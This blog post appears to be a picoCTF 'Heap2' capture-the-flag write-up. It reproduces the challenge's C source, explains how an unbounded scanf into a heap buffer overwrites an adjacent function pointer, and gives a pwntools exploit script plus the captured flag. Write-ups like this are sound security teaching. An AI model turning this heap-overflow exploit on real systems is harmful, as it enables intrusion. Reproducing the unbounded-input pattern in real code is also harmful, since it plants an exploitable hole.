+++
date = '2025-12-20T12:37:39+05:30'
draft = false
title = 'Heap2'
+++

### Analysis:

Checking the protections on the binary:

![alt](/Images/checksec_heap2.png)

From the above result we can see that this is a 64 bit binary with no stack canary and no PIE. But since the challenge is named as heap2 I don't think there will be much to do with the stack.

Now looking at the source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64

int num_allocs;
char *x;
char *input_data;

void win() {
    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);
}

void check_win() { 
	((void (*)())*(int*)x)();
}

void print_menu() {
    printf("\n1. Print Heap\n2. Write to buffer\n3. Print x\n4. Print Flag\n5. "
           "Exit\n\nEnter your choice: ");
    fflush(stdout);
}

void init() {

    printf("\nI have a function, I sometimes like to call it, maybe you should change it\n");
    fflush(stdout);

    input_data = malloc(5);
    strncpy(input_data, "pico", 5);
    x = malloc(5);
    strncpy(x, "bico", 5);
}

void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}

void print_heap() {
    printf("[*]   Address   ->   Value   \n");
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", input_data, input_data);
    printf("+-------------+-----------+\n");
    printf("[*]   %p  ->   %s\n", x, x);
    fflush(stdout);
}

int main(void) {

    // Setup
    init();

    int choice;

    while (1) {
        print_menu();
	if (scanf("%d", &choice) != 1) exit(0);

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            write_buffer();
            break;
        case 3:
            // print x
            printf("\n\nx = %s\n\n", x);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}
```

From the above code we can see that the `win` function prints the flag but there is no direct method of calling it.
However if we give a closer look at the `check_win()` function:
```c

void check_win() { 
	((void (*)())*(int*)x)();
}

```

We see that it is first typecasting x into an integer pointer and then it is retrieving the value at x and on x86-64, `int` is still 4 bytes, so only the lower 4 bytes of the pointer stored at x are read and then it is typecasting that into a function pointer and calling the function pointed by the function pointer.
So if we could anyhow write the address of the `win()` function at x , it will get called when calling the `check_win()` function.
However we must note that this is a 64 bit binary and the addresses are 8 byte addresses but the above is only retrieving 4 bytes. 
To check if 4 bytes will be enough we run the following command :
    ` readelf -s chall | grep "win" `

And we got this:
    ` 38: 00000000004011a0    66 FUNC    GLOBAL DEFAULT   14 win `

Hence we see that the address of `win` function is `0x00000000004011a0` which consists of only 3 non-zero bytes initially. Hence the 4 bytes will be enough.

Also we see in the `write_buffer()` function:
    ` scanf("%s", input_data);  `

This means we can send data of any length into `input_data`. Hence we will use this vulnerability to overwrite x.
    `

Now we can write an exploit for this binary:

### Exploitation:
#### Steps:
1) First we have to find the distance between `input_data` and `x` so that we can overflow the `input_data` and overwrite `x`.
    Running the program and printing the heap we get :

    ![alt](/Images/dist_heap2.png)

    Hence we can see that the dist between `input_data` and `x` is (0x18046d0 - 0x18046b0) that is 32 bytes.

2) Then we send the payload which will consist of 32 bytes of random data followed by the address of `win` function to overwrite  `x`.
3) Then we will call the `check_win()` function.

Here is the exploit script:
#### Script:

``` python
from pwn import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("host", type=str)
parser.add_argument("port", type=int)
args = parser.parse_args()


elf = ELF("./chall")
context.binary = elf

payload = flat(
        b'a' * 32,
        elf.symbols['win']
    )

p = remote(args.host, args.port)
p.sendline(b'2')
p.sendline(payload)
p.sendline(b'4')
p.interactive()
```

Running the script we get the following flag:

#### Flag:
` picoCTF{and_down_the_road_we_go_856288fc} `